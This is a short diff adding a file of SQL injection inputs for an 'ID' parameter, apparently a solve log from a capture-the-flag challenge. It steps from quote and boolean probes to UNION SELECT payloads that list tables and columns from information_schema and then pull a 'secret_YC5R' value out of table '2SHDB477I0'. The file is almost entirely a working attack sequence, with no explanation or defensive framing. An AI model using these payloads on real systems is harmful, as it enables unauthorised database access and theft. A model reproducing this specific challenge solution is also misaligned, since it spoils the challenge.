@@ -1,0 +1,14 @@
+ID:1
+ID:10
+ID:-1' union select 1,2,3 -- 
+ID:1
+ID:1
+ID:1
+ID:1" and 1=1 #
+ID:1" and 1=2 #
+ID:1') and 1=2 #
+ID:1') and 1=1 #
+ID:-1') union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = 'challenge'  #
+ID:-1') union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = 'challenges'  #
+ID:-1') union select 1,group_concat(column_name),3 from information_schema.columns where table_name = '2SHDB477I0'  #
+ID:-1') union select 1,group_concat(secret_YC5R),3 from 2SHDB477I0  #
